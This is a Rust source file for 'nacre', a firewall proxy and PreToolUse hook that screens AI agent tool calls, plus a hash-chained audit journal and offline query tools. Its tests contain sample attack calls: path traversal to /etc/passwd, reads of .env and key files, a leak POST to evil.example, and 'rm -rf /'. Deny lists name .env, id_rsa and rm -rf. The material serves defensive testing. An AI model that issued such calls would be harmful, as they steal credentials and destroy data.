//! production developer tools powered by `nacre-core` (zero external dependencies):
//!   - `nacre mcp-guard`:    stdio JSON-RPC 2.0 capability firewall proxy for any MCP server
//!   - `nacre hook`:         drop-in Claude Code / Codex `PreToolUse` stdin JSON guard (exit 0/2)
//!   - `nacre distill`:      JSONL call log -> SHA-256 sealed `.ncrystal` hybrid/pure reflex
//!   - `nacre query`:        verify `.ncrystal` offline and evaluate (`exit 0` hit / `exit 10` escalate)
//!   - `nacre audit-verify`: verify tamper-evident SHA-256 hash chain in a Merkle audit journal

use std::fs::{self, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use std::path::Path;
use std::process::{self, Command, Stdio};
use std::thread;

use nacre_core::arena::Arena;
use nacre_core::bundle::CrystalBundle;
use nacre_core::eval::{eval, Outcome};
use nacre_core::fuel::Fuel;
use nacre_core::hash::sha256;
use nacre_core::journal::run_and_record;
use nacre_core::lexicon::Lexicon;
use nacre_core::syntax::{parse_term, print_term};
use nacre_core::synthesize::{auto_crystallize_with_mode, SynthMode};

/// parsed policy flags shared by `mcp-guard` and `hook`.
#[derive(Clone, Debug, Default)]
pub struct GuardConfig {
    pub allow_paths: Vec<String>,
    pub deny_tools: Vec<String>,
    pub deny_substrs: Vec<String>,
    pub custom_policy_path: Option<String>,
    pub journal_path: Option<String>,
    pub print_policy: bool,
    pub child_cmd: Vec<String>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct GuardVerdict {
    pub allowed: bool,
    pub tool: String,
    pub target: String,
    pub outcome_sexpr: String,
    pub merkle_hash: String,
    pub fuel_used: u64,
}

fn normalize_path_like(s: &str) -> String {
    s.replace('\\', "/").to_ascii_lowercase()
}

fn nacre_str(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\0"),
            other => out.push(other),
        }
    }
    out.push('"');
    out
}

fn json_esc(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            other => out.push(other),
        }
    }
    out.push('"');
    out
}

/// build an executable, pure (0-cap) `nacre-core` algebraic `handle` firewall policy
/// directly from ergonomic CLI flags (`--allow-path`, `--deny-tool`, `--deny-substr`).
pub fn build_policy_source(cfg: &GuardConfig) -> Result<String, String> {
    if let Some(ref p) = cfg.custom_policy_path {
        return fs::read_to_string(p).map_err(|e| format!("failed to read policy '{}': {}", p, e));
    }

    let or_chain = |clauses: &[String]| -> String {
        if clauses.is_empty() {
            String::from("false")
        } else if clauses.len() == 1 {
            clauses[0].clone()
        } else {
            let mut acc = clauses[0].clone();
            for c in &clauses[1..] {
                acc = format!("(or {} {})", acc, c);
            }
            acc
        }
    };

    // 1. tool denylist
    let tool_clauses: Vec<String> = cfg
        .deny_tools
        .iter()
        .map(|t| format!("(eq ?tool {})", nacre_str(&t.to_ascii_lowercase())))
        .collect();

    // 2. substring denylist (checked against normalized target & raw args)
    let mut sub_clauses: Vec<String> = Vec::new();
    for s in &cfg.deny_substrs {
        let low = normalize_path_like(s);
        sub_clauses.push(format!("(str_contains ?target {})", nacre_str(&low)));
        sub_clauses.push(format!("(str_contains ?raw {})", nacre_str(&low)));
    }

    // 3. canonical path allowlist (when --allow-path is set)
    let path_body = if cfg.allow_paths.is_empty() {
        String::from("(ok (allowed ?tool ?target))")
    } else {
        let allow_clauses: Vec<String> = cfg
            .allow_paths
            .iter()
            .map(|p| {
                let norm = normalize_path_like(p);
                format!("(str_starts_with ?target {})", nacre_str(&norm))
            })
            .collect();
        let any_allowed = or_chain(&allow_clauses);
        format!(
            "(if (eq ?has_path \"1\")\n      (if (and {} (and (not (str_contains ?target \"..\")) (not (str_contains ?target \"%2e\"))))\n        (ok (allowed ?tool ?target))\n        (blocked outside_allowed_path ?target))\n      (ok (allowed ?tool ?target)))",
            any_allowed
        )
    };

    let after_substr = if sub_clauses.is_empty() {
        path_body
    } else {
        format!(
            "(if {}\n      (blocked denied_pattern ?target)\n      {})",
            or_chain(&sub_clauses),
            path_body
        )
    };

    let full_body = if tool_clauses.is_empty() {
        after_substr
    } else {
        format!(
            "(if {}\n    (blocked denied_tool ?tool)\n    {})",
            or_chain(&tool_clauses),
            after_substr
        )
    };

    Ok(format!(
        "(rule (mcp_fw (mcp_call ?tool ?target ?has_path ?raw) ?k)\n  {})",
        full_body
    ))
}

/// evaluate a single tool invocation strictly inside `nacre-core::eval` algebraic `handle`.
pub fn evaluate_tool_call(
    policy_src: &str,
    tool: &str,
    target: &str,
    has_path: bool,
    raw_args: &str,
) -> Result<GuardVerdict, String> {
    let mut arena = Arena::new();
    let mut lex = Lexicon::new();
    lex.load_source(&mut arena, policy_src)
        .map_err(|d| format!("policy load error: {}", d))?;

    let tool_n = tool.to_ascii_lowercase();
    let target_n = normalize_path_like(target);
    let raw_n = normalize_path_like(raw_args);
    let has_path_s = if has_path { "1" } else { "0" };

    let expr_src = format!(
        "(handle (perform mcp_call {} {} {} {}) 5000 mcp_fw)",
        nacre_str(&tool_n),
        nacre_str(&target_n),
        nacre_str(has_path_s),
        nacre_str(&raw_n)
    );
    let expr = parse_term(&mut arena, &expr_src).map_err(|d| format!("expr parse error: {}", d))?;

    // statically verify the handler rule itself is 100% pure (cannot escalate into any host cap)
    let audit_expr = parse_term(&mut arena, "(mcp_fw (mcp_call \"\" \"\" \"0\" \"\") dummy_k)")
        .map_err(|d| format!("audit parse error: {}", d))?;
    let static_caps = lex.static_cap_names(&arena, audit_expr);
    if !static_caps.is_empty() {
        return Err(format!(
            "policy rejected: non-pure handler attempted external caps [{}]",
            static_caps.join(", ")
        ));
    }

    let mut fuel = Fuel::new(10_000);
    match eval(&mut arena, &lex, expr, &mut fuel) {
        Outcome::Done(v) => {
            let txt = print_term(&arena, v);
            let allowed = !txt.starts_with("(blocked ");
            let hash = arena.hash(v).short_hex();
            Ok(GuardVerdict {
                allowed,
                tool: tool_n,
                target: target_n,
                outcome_sexpr: txt,
                merkle_hash: hash,
                fuel_used: fuel.used(),
            })
        }
        other => Err(format!("unexpected firewall outcome: {:?}", other)),
    }
}

/// parse shared guard flags (`--allow-path`, `--deny-tool`, `--deny-substr`, `--policy`, `--journal`, `--print-policy`, `-- <cmd>`).
pub fn parse_guard_args(args: &[String]) -> Result<GuardConfig, String> {
    let mut cfg = GuardConfig::default();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--" => {
                cfg.child_cmd = args[i + 1..].to_vec();
                break;
            }
            "--allow-path" if i + 1 < args.len() => {
                cfg.allow_paths.push(args[i + 1].clone());
                i += 2;
            }
            "--deny-tool" if i + 1 < args.len() => {
                cfg.deny_tools.push(args[i + 1].clone());
                i += 2;
            }
            "--deny-substr" if i + 1 < args.len() => {
                cfg.deny_substrs.push(args[i + 1].clone());
                i += 2;
            }
            "--policy" if i + 1 < args.len() => {
                cfg.custom_policy_path = Some(args[i + 1].clone());
                i += 2;
            }
            "--journal" if i + 1 < args.len() => {
                cfg.journal_path = Some(args[i + 1].clone());
                i += 2;
            }
            "--print-policy" => {
                cfg.print_policy = true;
                i += 1;
            }
            other => {
                return Err(format!("unknown guard flag '{}'", other));
            }
        }
    }
    Ok(cfg)
}

// ---------------------------------------------------------------------------
// tamper-evident SHA-256 hash-chained audit journal (`audit.jsonl`)
// ---------------------------------------------------------------------------

const GENESIS_HASH: &str = "0000000000000000000000000000000000000000000000000000000000000000";

fn compute_audit_link(prev_hash: &str, verdict: &GuardVerdict) -> String {
    let preimage = format!(
        "{}|{}|{}|{}|{}",
        prev_hash,
        if verdict.allowed { "allow" } else { "block" },
        verdict.tool,
        verdict.target,
        verdict.merkle_hash
    );
    sha256(preimage.as_bytes()).to_hex()
}

fn read_last_audit_hash(path: &str) -> String {
    let Ok(text) = fs::read_to_string(path) else {
        return String::from(GENESIS_HASH);
    };
    for line in text.lines().rev() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if let Some(h) = extract_json_string(trimmed, "entry_hash") {
            return h;
        }
    }
    String::from(GENESIS_HASH)
}

fn append_audit_entry(path: &str, prev_hash: &mut String, verdict: &GuardVerdict) -> Result<(), String> {
    if let Some(parent) = Path::new(path).parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).map_err(|e| format!("mkdir journal failed: {}", e))?;
        }
    }
    let entry_hash = compute_audit_link(prev_hash, verdict);
    let line = format!(
        "{{\"prev_hash\":{},\"entry_hash\":{},\"decision\":{},\"tool\":{},\"target\":{},\"merkle\":{},\"outcome\":{},\"fuel\":{}}}\n",
        json_esc(prev_hash),
        json_esc(&entry_hash),
        json_esc(if verdict.allowed { "allow" } else { "block" }),
        json_esc(&verdict.tool),
        json_esc(&verdict.target),
        json_esc(&verdict.merkle_hash),
        json_esc(&verdict.outcome_sexpr),
        verdict.fuel_used
    );
    let mut f = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .map_err(|e| format!("open journal failed: {}", e))?;
    f.write_all(line.as_bytes())
        .map_err(|e| format!("write journal failed: {}", e))?;
    *prev_hash = entry_hash;
    Ok(())
}

/// `nacre audit-verify <audit.jsonl>`: verify every SHA-256 link in an audit journal offline.
pub fn run_audit_verify(args: &[String]) -> Result<(), String> {
    if args.is_empty() {
        return Err("usage: nacre audit-verify <audit.jsonl>".into());
    }
    let text = fs::read_to_string(&args[0])
        .map_err(|e| format!("read audit journal failed: {}", e))?;
    let (count, blocks, head) = verify_audit_chain_text(&text)?;
    println!("audit_chain  verified");
    println!("entries      {} ({} blocked, {} allowed)", count, blocks, count - blocks);
    println!("head_hash    {}", &head[..12.min(head.len())]);
    Ok(())
}

pub fn verify_audit_chain_text(text: &str) -> Result<(usize, usize, String), String> {
    let mut expected_prev = String::from(GENESIS_HASH);
    let mut count = 0usize;
    let mut blocks = 0usize;

    for (idx, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() {
            continue;
        }
        let prev = extract_json_string(line, "prev_hash")
            .ok_or_else(|| format!("line {}: missing prev_hash", idx + 1))?;
        let entry = extract_json_string(line, "entry_hash")
            .ok_or_else(|| format!("line {}: missing entry_hash", idx + 1))?;
        let decision = extract_json_string(line, "decision")
            .ok_or_else(|| format!("line {}: missing decision", idx + 1))?;
        let tool = extract_json_string(line, "tool").unwrap_or_default();
        let target = extract_json_string(line, "target").unwrap_or_default();
        let merkle = extract_json_string(line, "merkle").unwrap_or_default();

        if prev != expected_prev {
            return Err(format!(
                "audit tamper detected at line {}: prev_hash mismatch (expected {}, got {})",
                idx + 1,
                &expected_prev[..12.min(expected_prev.len())],
                &prev[..12.min(prev.len())]
            ));
        }

        let v = GuardVerdict {
            allowed: decision == "allow",
            tool,
            target,
            outcome_sexpr: String::new(),
            merkle_hash: merkle,
            fuel_used: 0,
        };
        let recomputed = compute_audit_link(&prev, &v);
        if recomputed != entry {
            return Err(format!(
                "audit tamper detected at line {}: entry_hash mismatch",
                idx + 1
            ));
        }

        if !v.allowed {
            blocks += 1;
        }
        expected_prev = entry;
        count += 1;
    }

    Ok((count, blocks, expected_prev))
}

// ---------------------------------------------------------------------------
// zero-dependency JSON field extractors for MCP JSON-RPC 2.0 & Claude Code hooks
// ---------------------------------------------------------------------------

fn find_json_key_value_start(json: &str, key: &str) -> Option<usize> {
    let bytes = json.as_bytes();
    let needle = format!("\"{}\"", key);
    let mut offset = 0usize;
    while let Some(pos) = json[offset..].find(&needle) {
        let abs = offset + pos;
        let after_key = abs + needle.len();
        let rest = &bytes[after_key..];
        let mut j = 0;
        while j < rest.len() && rest[j].is_ascii_whitespace() {
            j += 1;
        }
        if j < rest.len() && rest[j] == b':' {
            j += 1;
            while j < rest.len() && rest[j].is_ascii_whitespace() {
                j += 1;
            }
            return Some(after_key + j);
        }
        offset = after_key;
    }
    None
}

fn parse_json_string_at(s: &str) -> Option<(String, usize)> {
    let bytes = s.as_bytes();
    if bytes.first() != Some(&b'"') {
        return None;
    }
    let mut out = String::new();
    let mut i = 1;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'\\' && i + 1 < bytes.len() {
            i += 1;
            match bytes[i] {
                b'"' => out.push('"'),
                b'\\' => out.push('\\'),
                b'/' => out.push('/'),
                b'n' => out.push('\n'),
                b'r' => out.push('\r'),
                b't' => out.push('\t'),
                b'u' if i + 4 < bytes.len() => {
                    if let Ok(hex) = core::str::from_utf8(&bytes[i + 1..i + 5]) {
                        if let Ok(cp) = u32::from_str_radix(hex, 16) {
                            if let Some(ch) = char::from_u32(cp) {
                                out.push(ch);
                            }
                        }
                    }
                    i += 4;
                }
                other => out.push(other as char),
            }
        } else if b == b'"' {
            return Some((out, i + 1));
        } else {
            // copy utf-8 char cleanly
            let ch = s[i..].chars().next()?;
            out.push(ch);
            i += ch.len_utf8();
            continue;
        }
        i += 1;
    }
    None
}

pub fn extract_json_string(json: &str, key: &str) -> Option<String> {
    let start = find_json_key_value_start(json, key)?;
    parse_json_string_at(&json[start..]).map(|(s, _)| s)
}

fn extract_json_raw_id(json: &str) -> String {
    let Some(start) = find_json_key_value_start(json, "id") else {
        return String::from("null");
    };
    let rest = &json[start..];
    if rest.starts_with('"') {
        if let Some((_, len)) = parse_json_string_at(rest) {
            return String::from(&rest[..len]);
        }
    }
    let end = rest
        .find(|c: char| c == ',' || c == '}' || c.is_ascii_whitespace())
        .unwrap_or(rest.len());
    let token = rest[..end].trim();
    if token.is_empty() {
        String::from("null")
    } else {
        String::from(token)
    }
}

fn extract_json_object_slice<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let start = find_json_key_value_start(json, key)?;
    let rest = &json[start..];
    if !rest.starts_with('{') {
        return None;
    }
    let bytes = rest.as_bytes();
    let mut depth = 0i32;
    let mut in_str = false;
    let mut esc = false;
    for (idx, &b) in bytes.iter().enumerate() {
        if in_str {
            if esc {
                esc = false;
            } else if b == b'\\' {
                esc = true;
            } else if b == b'"' {
                in_str = false;
            }
        } else {
            match b {
                b'"' => in_str = true,
                b'{' => depth += 1,
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(&rest[..=idx]);
                    }
                }
                _ => {}
            }
        }
    }
    None
}

/// extract `(tool_name, target_value, has_path, raw_args_str)` from an MCP `tools/call` JSON-RPC line.
pub fn parse_mcp_tools_call(line: &str) -> Option<(String, String, String, bool, String)> {
    let method = extract_json_string(line, "method")?;
    if method != "tools/call" {
        return None;
    }
    let id = extract_json_raw_id(line);
    let params = extract_json_object_slice(line, "params").unwrap_or(line);
    let tool = extract_json_string(params, "name").unwrap_or_else(|| String::from("unknown"));
    let args_obj = extract_json_object_slice(params, "arguments").unwrap_or(params);
    let (target, has_path) = extract_primary_target(args_obj);
    Some((id, tool, target, has_path, String::from(args_obj)))
}

/// extract `(tool_name, target_value, has_path, raw_args_str)` from Claude Code / Codex `PreToolUse` JSON.
pub fn parse_hook_payload(raw: &str) -> (String, String, bool, String) {
    let tool = extract_json_string(raw, "tool_name")
        .or_else(|| extract_json_string(raw, "tool"))
        .or_else(|| extract_json_string(raw, "name"))
        .unwrap_or_else(|| String::from("unknown"));
    let input_obj = extract_json_object_slice(raw, "tool_input")
        .or_else(|| extract_json_object_slice(raw, "arguments"))
        .unwrap_or(raw);
    let (target, has_path) = extract_primary_target(input_obj);
    (tool, target, has_path, String::from(input_obj))
}

fn extract_primary_target(obj: &str) -> (String, bool) {
    for path_key in ["file_path", "path", "filepath", "uri", "directory", "dir", "file"] {
        if let Some(v) = extract_json_string(obj, path_key) {
            return (v, true);
        }
    }
    for non_path_key in ["url", "command", "cmd", "query", "sql"] {
        if let Some(v) = extract_json_string(obj, non_path_key) {
            return (v, false);
        }
    }
    (String::new(), false)
}

/// format a spec-compliant JSON-RPC 2.0 error blocking an unauthorized MCP tool call.
pub fn mcp_block_response(id_raw: &str, verdict: &GuardVerdict) -> String {
    let msg = format!(
        "blocked by nacre handle firewall: {} [merkle {}]",
        verdict.outcome_sexpr, verdict.merkle_hash
    );
    format!(
        "{{\"jsonrpc\":\"2.0\",\"id\":{},\"error\":{{\"code\":-32003,\"message\":{}}}}}",
        id_raw,
        json_esc(&msg)
    )
}

// ---------------------------------------------------------------------------
// Command 1: `nacre mcp-guard`
// ---------------------------------------------------------------------------

pub fn run_mcp_guard(args: &[String]) -> Result<(), String> {
    let cfg = parse_guard_args(args)?;
    let policy_src = build_policy_source(&cfg)?;

    // pre-flight compile & static capability check before spawning anything
    let _ = evaluate_tool_call(&policy_src, "__preflight", "", false, "{}")?;

    if cfg.print_policy {
        println!("{}", policy_src);
        return Ok(());
    }

    if cfg.child_cmd.is_empty() {
        return Err(
            "usage: nacre mcp-guard [--allow-path <pfx>] [--deny-tool <name>] [--deny-substr <str>] [--policy <file>] [--journal <audit.jsonl>] -- <mcp-server-cmd> [args...]".into(),
        );
    }

    let mut child = Command::new(&cfg.child_cmd[0])
        .args(&cfg.child_cmd[1..])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()
        .map_err(|e| format!("failed to spawn child mcp server '{}': {}", cfg.child_cmd[0], e))?;

    let mut child_stdin = child
        .stdin
        .take()
        .ok_or_else(|| String::from("failed to open child stdin"))?;
    let child_stdout = child
        .stdout
        .take()
        .ok_or_else(|| String::from("failed to open child stdout"))?;

    // forward child stdout -> parent stdout transparently on a dedicated thread
    let out_handle = thread::spawn(move || {
        let mut reader = BufReader::new(child_stdout);
        let mut stdout = io::stdout();
        let mut line = String::new();
        loop {
            line.clear();
            match reader.read_line(&mut line) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    if stdout.write_all(line.as_bytes()).is_err() {
                        break;
                    }
                    let _ = stdout.flush();
                }
            }
        }
    });

    let mut prev_hash = cfg
        .journal_path
        .as_deref()
        .map(read_last_audit_hash)
        .unwrap_or_else(|| String::from(GENESIS_HASH));

    let stdin = io::stdin();
    let mut reader = BufReader::new(stdin.lock());
    let mut line = String::new();
    let mut stdout = io::stdout();

    loop {
        line.clear();
        let n = reader
            .read_line(&mut line)
            .map_err(|e| format!("stdin read error: {}", e))?;
        if n == 0 {
            break;
        }
        let trimmed = line.trim();
        if let Some((id_raw, tool, target, has_path, raw_args)) = parse_mcp_tools_call(trimmed) {
            let verdict = evaluate_tool_call(&policy_src, &tool, &target, has_path, &raw_args)?;
            if let Some(ref jpath) = cfg.journal_path {
                let _ = append_audit_entry(jpath, &mut prev_hash, &verdict);
            }
            if !verdict.allowed {
                eprintln!(
                    "nacre mcp-guard blocked {}({}) -> {} [merkle {}]",
                    verdict.tool, verdict.target, verdict.outcome_sexpr, verdict.merkle_hash
                );
                let resp = mcp_block_response(&id_raw, &verdict);
                writeln!(stdout, "{}", resp).map_err(|e| format!("stdout write error: {}", e))?;
                let _ = stdout.flush();
                continue;
            }
        }
        child_stdin
            .write_all(line.as_bytes())
            .map_err(|e| format!("child stdin write error: {}", e))?;
        let _ = child_stdin.flush();
    }

    drop(child_stdin);
    let _ = out_handle.join();
    let status = child.wait().map_err(|e| format!("child wait error: {}", e))?;
    if !status.success() {
        process::exit(status.code().unwrap_or(1));
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Command 2: `nacre hook` (Claude Code / Codex PreToolUse stdin guard)
// ---------------------------------------------------------------------------

pub fn run_hook(args: &[String]) -> Result<(), String> {
    let cfg = parse_guard_args(args)?;
    let policy_src = build_policy_source(&cfg)?;

    if cfg.print_policy {
        println!("{}", policy_src);
        return Ok(());
    }

    let mut payload = String::new();
    io::stdin()
        .read_to_string(&mut payload)
        .map_err(|e| format!("hook stdin read error: {}", e))?;
    let trimmed = payload.trim();
    if trimmed.is_empty() {
        return Ok(());
    }

    let (tool, target, has_path, raw_args) = parse_hook_payload(trimmed);
    let verdict = evaluate_tool_call(&policy_src, &tool, &target, has_path, &raw_args)?;

    if let Some(ref jpath) = cfg.journal_path {
        let mut prev = read_last_audit_hash(jpath);
        let _ = append_audit_entry(jpath, &mut prev, &verdict);
    }

    if !verdict.allowed {
        eprintln!(
            "blocked by nacre handle firewall: {} [merkle {}]",
            verdict.outcome_sexpr, verdict.merkle_hash
        );
        // exit code 2 is Claude Code's official native PreToolUse block signal
        process::exit(2);
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Commands 3 & 4: `nacre distill` and `nacre query` (JSONL -> .ncrystal -> offline lookup)
// ---------------------------------------------------------------------------

fn sanitize_sym_label(s: &str) -> String {
    let mut out = String::new();
    for c in s.trim().to_ascii_lowercase().chars() {
        if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
            out.push(c);
        } else {
            out.push('_');
        }
    }
    if out.is_empty() || out.chars().next().map(|c| c.is_ascii_digit()).unwrap_or(false) {
        format!("lbl_{}", out)
    } else {
        out
    }
}

pub fn run_distill(args: &[String]) -> Result<(), String> {
    let mut input_path: Option<String> = None;
    let mut out_path: Option<String> = None;
    let mut name = String::from("reflex");
    let mut pure = false;
    let mut min_support: usize = 4;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--input" | "-i" if i + 1 < args.len() => {
                input_path = Some(args[i + 1].clone());
                i += 2;
            }
            "--out" | "-o" if i + 1 < args.len() => {
                out_path = Some(args[i + 1].clone());
                i += 2;
            }
            "--name" if i + 1 < args.len() => {
                name = sanitize_sym_label(&args[i + 1]);
                i += 2;
            }
            "--min-support" if i + 1 < args.len() => {
                min_support = args[i + 1]
                    .parse::<usize>()
                    .map_err(|_| "invalid --min-support integer".to_string())?;
                i += 2;
            }
            "--pure" => {
                pure = true;
                i += 1;
            }
            other if input_path.is_none() && !other.starts_with('-') => {
                input_path = Some(String::from(other));
                i += 1;
            }
            other => return Err(format!("unknown distill arg '{}'", other)),
        }
    }

    let in_file = input_path.ok_or_else(|| {
        "usage: nacre distill --input <calls.jsonl> --out <skill.ncrystal> [--min-support 4] [--pure]"
            .to_string()
    })?;
    let jsonl = fs::read_to_string(&in_file)
        .map_err(|e| format!("failed to read '{}': {}", in_file, e))?;

    let mode = if pure {
        SynthMode::PureOffline
    } else {
        SynthMode::HybridGuarded { min_support }
    };

    let (bundle, synth_src, sample_count) = distill_jsonl_to_bundle(&jsonl, &name, mode)?;
    println!("distilled    {} samples -> {} ({})", sample_count, name, if pure { "pure_offline" } else { "hybrid_guarded" });
    println!("bundle_hash  {}", bundle.bundle_hash.short_hex());
    println!("effects      {} -> {} (eliminated {})", bundle.cert.base_effects, bundle.cert.new_effects, bundle.cert.effects_eliminated());
    println!("offline_pure {}", bundle.cert.is_now_pure());
    println!("synthesized  {}", synth_src.to_ascii_lowercase());

    if let Some(out) = out_path {
        fs::write(&out, bundle.encode_text())
            .map_err(|e| format!("failed to write '{}': {}", out, e))?;
        println!("written      {}", out.to_ascii_lowercase());
    }
    Ok(())
}

pub fn distill_jsonl_to_bundle(
    jsonl: &str,
    name: &str,
    mode: SynthMode,
) -> Result<(CrystalBundle, String, usize), String> {
    let base_src = "(rule (classify ?msg) (perform llm_oracle ?msg))\n(rule (route ?msg) (classify ?msg))";
    let mut arena = Arena::new();
    let mut base_lex = Lexicon::new();
    base_lex
        .load_source(&mut arena, base_src)
        .map_err(|d| format!("{}", d))?;

    let mut traces = Vec::new();
    for line in jsonl.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let inp = extract_json_string(trimmed, "input")
            .or_else(|| extract_json_string(trimmed, "text"))
            .or_else(|| extract_json_string(trimmed, "prompt"));
        let out = extract_json_string(trimmed, "output")
            .or_else(|| extract_json_string(trimmed, "label"))
            .or_else(|| extract_json_string(trimmed, "class"));
        let (Some(inp_s), Some(out_s)) = (inp, out) else {
            continue;
        };
        let clean_lbl = sanitize_sym_label(&out_s);
        let entry_src = format!("(route {})", nacre_str(&inp_s.to_ascii_lowercase()));
        let entry = parse_term(&mut arena, &entry_src).map_err(|d| format!("{}", d))?;
        let tr = run_and_record(&mut arena, &base_lex, entry, 5000, |a, _| {
            let sym = a.intern_sym(&clean_lbl);
            Ok(a.mk_sym(sym)?.0)
        })
        .map_err(|d| format!("{}", d))?;
        traces.push(tr);
    }

    if traces.is_empty() {
        return Err("no valid {\"input\":\"...\",\"output\":\"...\"} lines found in jsonl".into());
    }

    let ac = auto_crystallize_with_mode(&mut arena, &base_lex, &traces, mode)
        .map_err(|d| format!("{}", d))?;
    let full_lex = ac.lexicon.to_source(&arena);
    let bundle = CrystalBundle::new(name, &full_lex, ac.cert, None);
    Ok((bundle, ac.synthesized_src, traces.len()))
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum QueryResult {
    Hit(String, u64),
    Escalate(String),
}

pub fn query_bundle_wire(wire: &str, input: &str) -> Result<QueryResult, String> {
    let bundle = CrystalBundle::decode_text(wire).map_err(|d| format!("bundle error: {}", d))?;
    let _info = bundle
        .verify()
        .map_err(|d| format!("tamper/verification failed: {}", d))?;

    let mut arena = Arena::new();
    let mut lex = Lexicon::new();
    lex.load_source(&mut arena, &bundle.lexicon_src)
        .map_err(|d| format!("{}", d))?;

    let entry_src = format!("(route {})", nacre_str(&input.to_ascii_lowercase()));
    let entry = parse_term(&mut arena, &entry_src).map_err(|d| format!("{}", d))?;
    let mut fuel = Fuel::new(5000);
    match eval(&mut arena, &lex, entry, &mut fuel) {
        Outcome::Done(v) => Ok(QueryResult::Hit(print_term(&arena, v), fuel.used())),
        Outcome::Yield { effect, .. } => Ok(QueryResult::Escalate(print_term(&arena, effect))),
        other => Err(format!("query fault: {:?}", other)),
    }
}

/// `nacre query <skill.ncrystal> <input|--stdin>`:
/// exits `0` with offline answer on stdout, `10` if unseen (escalate to llm), `3` if tampered.
pub fn run_query(args: &[String]) -> Result<(), String> {
    if args.len() < 2 {
        return Err("usage: nacre query <skill.ncrystal> <input|--stdin>".into());
    }
    let wire = fs::read_to_string(&args[0])
        .map_err(|e| format!("failed to read bundle '{}': {}", args[0], e))?;
    let input = if args[1] == "--stdin" {
        let mut s = String::new();
        io::stdin()
            .read_to_string(&mut s)
            .map_err(|e| format!("stdin read failed: {}", e))?;
        s
    } else {
        args[1..].join(" ")
    };

    match query_bundle_wire(&wire, input.trim()) {
        Ok(QueryResult::Hit(val, _fuel)) => {
            println!("{}", val.to_ascii_lowercase());
            Ok(())
        }
        Ok(QueryResult::Escalate(_eff)) => {
            eprintln!("escalate");
            process::exit(10);
        }
        Err(msg) => {
            eprintln!("{}", msg.to_ascii_lowercase());
            process::exit(3);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mcp_guard_blocks_hijacks_and_allows_canonical_paths() {
        let cfg = GuardConfig {
            allow_paths: vec!["/public/".into()],
            deny_tools: vec!["http_post".into()],
            deny_substrs: vec![".env".into(), "id_rsa".into()],
            ..Default::default()
        };
        let policy = build_policy_source(&cfg).unwrap();

        // 1. haiku 5.5 prefix collision hijack
        let msg1 = r#"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"fs_read","arguments":{"path":"/public_secret/prod_keys.env"}}}"#;
        let (id, tool, target, has_path, raw) = parse_mcp_tools_call(msg1).unwrap();
        assert_eq!(id, "7");
        let v1 = evaluate_tool_call(&policy, &tool, &target, has_path, &raw).unwrap();
        assert!(!v1.allowed);
        let resp = mcp_block_response(&id, &v1);
        assert!(resp.contains("-32003"));
        assert!(resp.contains(&v1.merkle_hash));

        // 2. dotdot traversal + Windows backslash normalization
        let msg2 = r#"{"jsonrpc":"2.0","id":"req-2","method":"tools/call","params":{"name":"fs_read","arguments":{"path":"\\public\\..\\etc\\passwd"}}}"#;
        let (_, tool2, target2, hp2, raw2) = parse_mcp_tools_call(msg2).unwrap();
        let v2 = evaluate_tool_call(&policy, &tool2, &target2, hp2, &raw2).unwrap();
        assert!(!v2.allowed);

        // 3. denied tool
        let msg3 = r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"http_post","arguments":{"url":"https://evil.example/leak"}}}"#;
        let (_, tool3, target3, hp3, raw3) = parse_mcp_tools_call(msg3).unwrap();
        let v3 = evaluate_tool_call(&policy, &tool3, &target3, hp3, &raw3).unwrap();
        assert!(!v3.allowed);

        // 4. legitimate /public/ read passes!
        let msg4 = r#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"fs_read","arguments":{"path":"/public/readme.md"}}}"#;
        let (_, tool4, target4, hp4, raw4) = parse_mcp_tools_call(msg4).unwrap();
        let v4 = evaluate_tool_call(&policy, &tool4, &target4, hp4, &raw4).unwrap();
        assert!(v4.allowed);
    }

    #[test]
    fn claude_code_pretooluse_hook_blocks_secrets_and_dangerous_bash() {
        let cfg = GuardConfig {
            allow_paths: vec!["/repo/src/".into()],
            deny_tools: vec![],
            deny_substrs: vec![".env".into(), "rm -rf".into()],
            ..Default::default()
        };
        let policy = build_policy_source(&cfg).unwrap();

        let bad_read = r#"{"tool_name":"Read","tool_input":{"file_path":"/repo/.env"}}"#;
        let (t1, p1, hp1, r1) = parse_hook_payload(bad_read);
        assert!(!evaluate_tool_call(&policy, &t1, &p1, hp1, &r1).unwrap().allowed);

        let bad_bash = r#"{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}"#;
        let (t2, p2, hp2, r2) = parse_hook_payload(bad_bash);
        assert!(!evaluate_tool_call(&policy, &t2, &p2, hp2, &r2).unwrap().allowed);

